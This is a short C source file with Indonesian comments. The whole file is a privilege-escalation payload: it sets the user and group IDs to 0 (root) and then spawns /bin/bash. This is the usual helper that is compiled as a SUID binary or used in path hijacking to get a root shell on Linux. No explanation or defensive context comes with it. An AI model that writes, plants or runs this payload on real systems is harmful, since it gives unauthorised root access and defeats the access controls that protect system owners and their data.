#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0); // jadi root
    setgid(0);
    system("/bin/bash"); // bagi shell
    return 0;
}
